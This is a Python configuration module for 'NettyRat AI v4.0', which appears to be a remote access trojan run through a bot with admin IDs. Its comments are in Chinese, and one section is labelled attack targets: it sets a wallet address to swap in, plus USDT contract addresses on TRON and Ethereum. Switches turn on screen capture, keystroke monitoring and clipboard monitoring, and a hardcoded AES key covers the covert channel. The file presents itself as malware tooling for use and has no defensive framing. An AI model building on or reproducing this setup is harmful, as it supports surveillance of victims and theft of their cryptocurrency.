#!/usr/bin/env python3
"""NettyRat AI v4.0 - 全局配置 (Termux兼容版)"""
import os
import platform

# 检测 Termux
IS_TERMUX = os.path.exists("/data/data/com.termux")

class Config:
    """配置中心"""

    # === Bot 配置 ===
    BOT_TOKEN = os.getenv("BOT_TOKEN", "")
    ADMIN_IDS = list(map(int, os.getenv("ADMIN_IDS", "0").split(",")))

    # === 能量系统 ===
    MAX_ENERGY = int(os.getenv("MAX_ENERGY", "1000"))
    ENERGY_REGEN = float(os.getenv("ENERGY_REGEN", "2.0"))

    # === AI 配置 ===
    AI_LEARNING_RATE = float(os.getenv("AI_LEARNING_RATE", "0.1"))
    AI_MEMORY_SIZE = int(os.getenv("AI_MEMORY_SIZE", "1000"))

    # === 加密通信 ===
    AES_KEY = os.getenv("AES_KEY", "NettyRat2024SecureKey32bytes!!")

    # === 攻击目标配置 ===
    REPLACE_WALLET = os.getenv("REPLACE_WALLET", "")
    TARGET_API = os.getenv("TARGET_API", "")

    # === TRON 配置 ===
    TRON_API = "https://api.trongrid.io"
    USDT_CONTRACT_TRON = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"

    # === ETH 配置 ===
    ETHERSCAN_API = os.getenv("ETHERSCAN_API", "")
    USDT_CONTRACT_ETH = "0xdAC17F958D2ee523a2206206994597C13D831ec7"

    # === 功能开关 ===
    ENABLE_SCREEN = True
    ENABLE_INPUT = not IS_TERMUX  # Termux 禁用输入监控
    ENABLE_CLIPBOARD = not IS_TERMUX  # Termux 禁用剪切板
    ENABLE_CRYPTO = True
    ENABLE_AI = True

    # === 路径配置 (Termux兼容) ===
    if IS_TERMUX:
        TEMP_DIR = os.path.expanduser("~/nettyrat_tmp")
        LOG_FILE = os.path.expanduser("~/nettyrat.log")
        DATA_DIR = os.path.expanduser("~/nettyrat_data")
    else:
        TEMP_DIR = "/tmp/nettyrat"
        LOG_FILE = "/tmp/nettyrat.log"
        DATA_DIR = "data"

    @classmethod
    def is_admin(cls, user_id: int) -> bool:
        return user_id in cls.ADMIN_IDS

    @classmethod
    def validate(cls) -> list:
        errors = []
        if not cls.BOT_TOKEN:
            errors.append("BOT_TOKEN 未设置")
        if not cls.ADMIN_IDS or cls.ADMIN_IDS == [0]:
            errors.append("ADMIN_IDS 未设置")
        return errors

    @classmethod
    def init_dirs(cls):
        """初始化目录"""
        for d in [cls.TEMP_DIR, cls.DATA_DIR]:
            os.makedirs(d, exist_ok=True)
